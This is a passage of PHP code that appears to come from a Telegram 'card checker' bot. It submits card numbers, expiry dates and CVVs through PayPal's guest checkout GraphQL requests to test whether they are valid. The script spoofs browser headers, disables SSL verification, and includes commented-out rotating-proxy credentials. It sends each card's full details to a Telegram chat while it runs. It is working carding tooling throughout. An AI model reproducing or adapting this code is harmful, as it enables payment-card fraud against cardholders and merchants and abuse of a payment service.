$headers[] = 'referer: https://www.paypal.com/smart/buttons?style.label=checkout&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.height=45&components.0=buttons&components.1=messages&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&clientID=AUESd5dCP7FmcZnzB7v32UIo-gGgnJupvdfLle9TBJwOC4neACQhDVONBv3hc1W-pXlXS6G-KA5y4Kzv&sdkCorrelationID=f53694928f373&storageID=uid_36f9fe73ae_mta6ntu6mzy&sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&env=production&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJtZXJjaGFudENvbmZpZ0hhc2giOiIzZjBjZTQyY2I4M2FiZmRhY2NhYzM0NmNmMmM3YmNhYTMzNDE1MGRlIiwicHJvZHVjdHMiOnsicGF5SW40Ijp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6dHJ1ZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.disablePaylater=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=UHALZ2245EDV6&renderedButtons.0=paypal&renderedButtons.1=paylater&renderedButtons.2=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-app-name: smart-payment-buttons';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n            mutation UpdateClientConfig(\n                $orderID : String!,\n                $fundingSource : ButtonFundingSourceType!,\n                $integrationArtifact : IntegrationArtifactType!,\n                $userExperienceFlow : UserExperienceFlowType!,\n                $productFlow : ProductFlowType!,\n                $buttonSessionID : String\n            ) {\n                updateClientConfig(\n                    token: $orderID,\n                    fundingSource: $fundingSource,\n                    integrationArtifact: $integrationArtifact,\n                    userExperienceFlow: $userExperienceFlow,\n                    productFlow: $productFlow,\n                    buttonSessionID: $buttonSessionID\n                )\n            }\n        ","variables":{"orderID":"'.$token.'","fundingSource":"card","integrationArtifact":"PAYPAL_JS_SDK","userExperienceFlow":"INLINE","productFlow":"SMART_PAYMENT_BUTTONS"}}');
$curl03 = curl_exec($ch);
$content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ▰▰▰▰▰▱▱▱▱▱ 50%</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m5  = EditMessageText($content);
        $m5i = $m5['result']['message_id'];
#------[CURL- EXTRA]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?GetCheckoutDetails');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: POST';
$headers[] = 'path: /graphql?GetCheckoutDetails';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.paypal.com';
$headers[] = 'paypal-client-context: '.$token.'';
$headers[] = 'referer: https://www.paypal.com/smart/buttons?style.label=checkout&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.height=45&components.0=buttons&components.1=messages&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&clientID=AUESd5dCP7FmcZnzB7v32UIo-gGgnJupvdfLle9TBJwOC4neACQhDVONBv3hc1W-pXlXS6G-KA5y4Kzv&sdkCorrelationID=f53694928f373&storageID=uid_36f9fe73ae_mta6ntu6mzy&sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&env=production&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJtZXJjaGFudENvbmZpZ0hhc2giOiIzZjBjZTQyY2I4M2FiZmRhY2NhYzM0NmNmMmM3YmNhYTMzNDE1MGRlIiwicHJvZHVjdHMiOnsicGF5SW40Ijp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6dHJ1ZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.disablePaylater=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=UHALZ2245EDV6&renderedButtons.0=paypal&renderedButtons.1=paylater&renderedButtons.2=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-app-name: smart-payment-buttons';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n            query GetCheckoutDetails($orderID: String!) {\n                checkoutSession(token: $orderID) {\n                    cart {\n                        billingType\n                        intent\n                        paymentId\n                        billingToken\n                        amounts {\n                            total {\n                                currencyValue\n                                currencyCode\n                                currencyFormatSymbolISOCurrency\n                            }\n                        }\n                        supplementary {\n                            initiationIntent\n                        }\n                        category\n                    }\n                    flags {\n                        isChangeShippingAddressAllowed\n                    }\n                    payees {\n                        merchantId\n                        email {\n                            stringValue\n                        }\n                    }\n                }\n            }\n        ","variables":{"orderID":"'.$token.'"}}');
$curl04 = curl_exec($ch);


#------[GET-3]------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/card-fields?sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token=EC-3NT75172S6225680U');
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: GET';
$headers[] = 'path: /smart/card-fields?sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token=EC-3NT75172S6225680U';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://www.paypal.com/smart/buttons?style.label=checkout&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.height=45&components.0=buttons&components.1=messages&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&clientID=AUESd5dCP7FmcZnzB7v32UIo-gGgnJupvdfLle9TBJwOC4neACQhDVONBv3hc1W-pXlXS6G-KA5y4Kzv&sdkCorrelationID=f53694928f373&storageID=uid_36f9fe73ae_mta6ntu6mzy&sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&env=production&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJtZXJjaGFudENvbmZpZ0hhc2giOiIzZjBjZTQyY2I4M2FiZmRhY2NhYzM0NmNmMmM3YmNhYTMzNDE1MGRlIiwicHJvZHVjdHMiOnsicGF5SW40Ijp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6dHJ1ZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.disablePaylater=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=UHALZ2245EDV6&renderedButtons.0=paypal&renderedButtons.1=paylater&renderedButtons.2=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: iframe';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token='.$token.'');
$get3 = curl_exec($ch);

$content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ▰▰▰▰▰▰▰▱▱▱ 70%</b>", 'message_id' => $m5i, 'parse_mode' => 'html'];
        $m6  = EditMessageText($content);
        $m6i = $m6['result']['message_id'];
//==============[ 1st req ]==============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
// curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "fuqfmchk-rotate:5bwflde4f03p");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: POST';
$headers[] = 'path: /graphql?fetch_credit_form_submit';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8,bn;q=0.7';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.paypal.com';
$headers[] = 'paypal-client-context: '.$token.'';
$headers[] = 'paypal-client-metadata-id: '.$token.'';
$headers[] = 'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_0580164318_mta6mzk6nte&buttonSessionID=uid_6dc1213f73_mta6nda6nde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token=EC-5FS8055486889604B';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-gpc: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-app-name: standardcardfields';
$headers[] = 'x-country: US';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$token.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","postalCode":"10080","securityCode":"'.$cvv.'"},"phoneNumber":"4139290139","firstName":"Gey","lastName":"Paypal","billingAddress":{"givenName":"Gey","familyName":"Paypal","line1":null,"line2":null,"city":null,"state":null,"postalCode":"10080","country":"US"},"email":"'.$email.'","currencyConversionType":"PAYPAL"},"operationName":null}');
$curl1 = curl_exec($ch);
$content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ▰▰▰▰▰▰▰▰▰▱ 90%</b>", 'message_id' => $m6i, 'parse_mode' => 'html'];
        $m7  = EditMessageText($content);
        $m7i = $m7['result']['message_id'];
//Trimming The Response
$error = getData($curl1,'"code":"','"');

$msg = getData($curl1,'"message":"','"');
unlink("cookie.txt");

if(empty($msg)){
    $msg = "R_ERROR";
}

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ▰▰▰▰▰▰▰▰▰▰ 100% </b>", 'message_id' => $m7i, 'parse_mode' => 'html'];
        $m8  = EditMessageText($content);
        $xdid = $m8['result']['message_id'];

